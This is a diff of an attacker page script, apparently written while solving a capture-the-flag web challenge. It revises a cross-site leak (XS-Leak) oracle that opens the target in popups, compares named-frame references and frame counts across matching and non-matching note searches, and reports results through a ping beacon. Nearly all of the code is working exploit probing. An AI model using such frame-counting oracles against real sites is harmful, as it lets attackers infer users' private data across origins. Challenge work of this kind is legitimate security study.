@@ -11,181 +11,87 @@ function log(m) { document.getElementById('log').textContent += m + '\n'; }
 function sleep(ms) { return new Promise(function(r) { setTimeout(r, ms); }); }
 
 async function run() {
-  ping('v13_start');
+  ping('v14_start');
 
-  // === T1: Can we close() named frames to remove them? ===
-  log('T1: close named frames');
-  var w1 = window.open(CHALL + '/?name=x&referrerPolicy=adf');
-  await sleep(2000);
-  var t1_before = -1;
-  try { t1_before = w1.length; } catch(e) { t1_before = 'E'; }
-
-  // Try closing the named frame
-  var closeResults = [];
-  for (var i = 0; i < 15; i++) {
+  // === T1: Comparison oracle - MATCH (no search = all notes shown) ===
+  // With name=adf on ads, check popup[0] === popup['adf']
+  // Nomatch: always true. Match: false when note is at index 0 (~1/N chance)
+  log('T1: comparison oracle - match');
+  var matchUrl = CHALL + '/?name=x&referrerPolicy=adf';
+  var w = window.open(matchUrl);
+  await sleep(1500);
+  var matchRes = [];
+  for (var i = 0; i < 20; i++) {
     try {
-      var ref = w1['adf'];
-      if (!ref) { closeResults.push('noref'); break; }
-      ref.close();
-      await sleep(50);
-      var len = -1;
-      try { len = w1.length; } catch(e) { len = 'E'; }
-      closeResults.push(len);
-    } catch(e) {
-      closeResults.push('err:' + e.message.substring(0, 20));
-      break;
-    }
+      var named = w['adf'];
+      if (!named) { matchRes.push('N'); }
+      else {
+        var eq = (w[0] === named) ? 'T' : 'F';
+        matchRes.push(w.length + eq);
+      }
+    } catch(e) { matchRes.push('E'); }
+    w.location = matchUrl;
+    await sleep(700);
   }
-  w1.close();
-  ping('t1=' + t1_before + '_' + closeResults.join(','));
+  w.close();
+  ping('t1_match=' + matchRes.join(','));
+  log('T1 done: ' + matchRes.join(','));
   await sleep(300);
 
-  // === T2: Same but for NOMATCH ===
-  log('T2: close named nomatch');
-  var w2 = window.open(CHALL + '/?name=x&referrerPolicy=adf&search=zzzzzzz');
-  await sleep(2000);
-  var t2_before = -1;
-  try { t2_before = w2.length; } catch(e) { t2_before = 'E'; }
-
-  var closeResults2 = [];
-  for (var i = 0; i < 15; i++) {
+  // === T2: Comparison oracle - NOMATCH ===
+  log('T2: comparison oracle - nomatch');
+  var nomatchUrl = CHALL + '/?name=x&referrerPolicy=adf&search=zzzzzzz';
+  w = window.open(nomatchUrl);
+  await sleep(1500);
+  var nomatchRes = [];
+  for (var i = 0; i < 20; i++) {
     try {
-      var ref = w2['adf'];
-      if (!ref) { closeResults2.push('noref'); break; }
-      ref.close();
-      await sleep(50);
-      var len = -1;
-      try { len = w2.length; } catch(e) { len = 'E'; }
-      closeResults2.push(len);
-    } catch(e) {
-      closeResults2.push('err:' + e.message.substring(0, 20));
-      break;
-    }
+      var named = w['adf'];
+      if (!named) { nomatchRes.push('N'); }
+      else {
+        var eq = (w[0] === named) ? 'T' : 'F';
+        nomatchRes.push(w.length + eq);
+      }
+    } catch(e) { nomatchRes.push('E'); }
+    w.location = nomatchUrl;
+    await sleep(700);
   }
-  w2.close();
-  ping('t2=' + t2_before + '_' + closeResults2.join(','));
+  w.close();
+  ping('t2_nomatch=' + nomatchRes.join(','));
+  log('T2 done: ' + nomatchRes.join(','));
   await sleep(300);
 
-  // === T3: Navigate named frame to about:blank, check if name persists ===
-  log('T3: navigate named frame');
-  var w3 = window.open(CHALL + '/?name=x&referrerPolicy=adf');
-  await sleep(2000);
+  // === T3: Name clearing via window.open ===
+  log('T3: name clearing test');
+  w = window.open(matchUrl);
+  await sleep(1500);
   var t3 = {};
-  try { t3.len = w3.length; } catch(e) { t3.len = 'E'; }
   try {
-    var ref3 = w3['adf'];
-    t3.hasRef = ref3 ? 'yes' : 'no';
-    // Navigate to about:blank
-    ref3.location = 'about:blank';
+    t3.len = w.length;
+    // Can window.open find the named frame?
+    var o = window.open('about:blank', 'adf');
+    t3.gotRef = o ? 'yes' : 'no';
     await sleep(200);
-    // Check if popup['adf'] still exists
-    var ref3b = w3['adf'];
-    t3.afterNav = ref3b ? 'yes' : 'no';
-    // Check length
-    try { t3.lenAfter = w3.length; } catch(e) { t3.lenAfter = 'E'; }
-    // Check if the navigated frame's length changed
-    try { t3.subLen = ref3b.length; } catch(e) { t3.subLen = 'E'; }
-  } catch(e) {
-    t3.err = e.message.substring(0, 40);
-  }
-  w3.close();
-  ping('t3=' + JSON.stringify(t3));
-  await sleep(300);
-
-  // === T4: Use window.open to target named frame ===
-  log('T4: window.open targeting named frame');
-  var w4 = window.open(CHALL + '/?name=x&referrerPolicy=adf');
-  await sleep(2000);
-  var t4 = {};
-  try { t4.len = w4.length; } catch(e) { t4.len = 'E'; }
-  // Use window.open to navigate the named frame
-  try {
-    var opened = window.open('about:blank', 'adf');
-    t4.opened = opened ? 'yes' : 'no';
-    await sleep(200);
-    // Check if it's same-origin now (about:blank inherits opener origin)
-    try { t4.openedLen = opened.length; } catch(e) { t4.openedLen = 'E'; }
-    try { t4.openedName = opened.name; } catch(e) { t4.openedName = 'E'; }
-    try { t4.openedDoc = opened.document.title; } catch(e) { t4.openedDoc = 'E'; }
-    // Check if we can write to it
-    try {
-      opened.document.write('<h1>test</h1>');
-      t4.wrote = 'yes';
-    } catch(e) { t4.wrote = 'E:' + e.message.substring(0, 30); }
-    // Can we change its name?
-    try {
-      opened.name = '';
-      t4.nameCleared = 'yes';
-    } catch(e) { t4.nameCleared = 'E'; }
+    // Test cross-origin access
+    try { t3.oLen = o.length; } catch(e) { t3.oLen = 'E'; }
+    try { t3.oName = o.name; } catch(e) { t3.oName = 'E'; }
+    // Try setting name
+    try { o.name = ''; t3.setName = 'ok'; } catch(e) { t3.setName = 'E'; }
     await sleep(100);
-    // After clearing name, does popup['adf'] point to next frame?
+    // Did it work? Check if popup['adf'] changed
+    t3.adfStill = w['adf'] ? 'yes' : 'no';
+    // Is the reference the same or different?
     try {
-      var next = w4['adf'];
-      t4.nextRef = next ? 'yes' : 'no';
-    } catch(e) { t4.nextRef = 'E'; }
-    try { t4.lenAfter = w4.length; } catch(e) { t4.lenAfter = 'E'; }
-  } catch(e) {
-    t4.err = e.message.substring(0, 40);
-  }
-  w4.close();
-  ping('t4=' + JSON.stringify(t4));
-  await sleep(300);
+      var o2 = w['adf'];
+      t3.sameRef = (o2 === o) ? 'same' : 'diff';
+    } catch(e) { t3.sameRef = 'E'; }
+    t3.lenAfter = w.length;
+  } catch(e) { t3.err = e.message.substring(0, 40); }
+  w.close();
+  ping('t3=' + JSON.stringify(t3));
+  log('T3: ' + JSON.stringify(t3));
 
-  // === T5: Repeat T4 approach for MATCH - iteratively clear names ===
-  log('T5: iterative name clearing - match');
-  var w5 = window.open(CHALL + '/?name=x&referrerPolicy=adf');
-  await sleep(2000);
-  var t5_before = -1;
-  try { t5_before = w5.length; } catch(e) { t5_before = 'E'; }
-
-  var cleared = 0;
-  for (var i = 0; i < 15; i++) {
-    try {
-      var ref5 = w5['adf'];
-      if (!ref5) break;
-      // Navigate to about:blank via window.open
-      var o5 = window.open('about:blank', 'adf');
-      await sleep(100);
-      // Try to clear name
-      try { o5.name = ''; } catch(e) {}
-      cleared++;
-    } catch(e) { break; }
-  }
-  var t5_after = -1;
-  try { t5_after = w5.length; } catch(e) { t5_after = 'E'; }
-  // Check if unnamed frames remain
-  var t5_hasAdf = 'no';
-  try { if (w5['adf']) t5_hasAdf = 'yes'; } catch(e) { t5_hasAdf = 'E'; }
-  w5.close();
-  ping('t5=before:' + t5_before + '_cleared:' + cleared + '_after:' + t5_after + '_hasAdf:' + t5_hasAdf);
-  await sleep(300);
-
-  // === T6: Same for NOMATCH ===
-  log('T6: iterative name clearing - nomatch');
-  var w6 = window.open(CHALL + '/?name=x&referrerPolicy=adf&search=zzzzzzz');
-  await sleep(2000);
-  var t6_before = -1;
-  try { t6_before = w6.length; } catch(e) { t6_before = 'E'; }
-
-  var cleared6 = 0;
-  for (var i = 0; i < 15; i++) {
-    try {
-      var ref6 = w6['adf'];
-      if (!ref6) break;
-      var o6 = window.open('about:blank', 'adf');
-      await sleep(100);
-      try { o6.name = ''; } catch(e) {}
-      cleared6++;
-    } catch(e) { break; }
-  }
-  var t6_after = -1;
-  try { t6_after = w6.length; } catch(e) { t6_after = 'E'; }
-  var t6_hasAdf = 'no';
-  try { if (w6['adf']) t6_hasAdf = 'yes'; } catch(e) { t6_hasAdf = 'E'; }
-  w6.close();
-  ping('t6=before:' + t6_before + '_cleared:' + cleared6 + '_after:' + t6_after + '_hasAdf:' + t6_hasAdf);
-
-  ping('v13_done');
+  ping('v14_done');
   log('Done!');
 }
 run();
